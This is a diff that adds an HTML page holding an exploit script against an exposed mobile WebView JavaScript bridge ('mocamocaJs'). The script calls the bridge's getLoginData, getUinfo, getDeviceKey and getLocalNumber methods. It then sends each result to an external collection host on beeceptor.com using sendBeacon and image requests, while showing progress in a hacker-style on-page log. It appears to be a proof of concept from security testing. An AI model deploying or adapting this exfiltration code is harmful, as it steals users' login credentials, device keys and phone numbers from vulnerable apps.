@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>.</title></head>
+<body style="background:#000;color:#0f0;font:13px monospace;padding:16px;">
+<pre id="log">bridge: detecting...</pre>
+<script>
+var OAST = "fdsfdsfdfdfdfdfdfdf.free.beeceptor.com";
+
+function leak(k, v) {
+  var b = new Blob([JSON.stringify({k:k, v:v, t:Date.now()})], {type:"text/plain"});
+  navigator.sendBeacon("https://"+OAST+"/"+encodeURIComponent(k), b);
+  new Image().src = "https://"+OAST+"/i?k="+encodeURIComponent(k)+"&v="+encodeURIComponent(String(v).substring(0,1800));
+}
+
+var b = window.mocamocaJs;
+if (!b) { log.textContent = "NO BRIDGE"; } else {
+  log.textContent = "bridge: OK — dumping...";
+
+  try {
+    var d = b.getLoginData();
+    log.textContent += "\n  getLoginData() = " + d;
+    leak("LoginData", d);
+  } catch(e) {
+    log.textContent += "\n  ERROR: " + e.message;
+    leak("LoginData", "error:" + e.message);
+  }
+
+  try { leak("Uinfo", b.getUinfo()); } catch(e) {}
+  try { leak("DeviceKey", b.getDeviceKey()); } catch(e) {}
+  try { leak("LocalNumber", b.getLocalNumber()); } catch(e) {}
+
+  log.textContent += "\n\ndone";
+}
+</script>
+</body>
+</html>
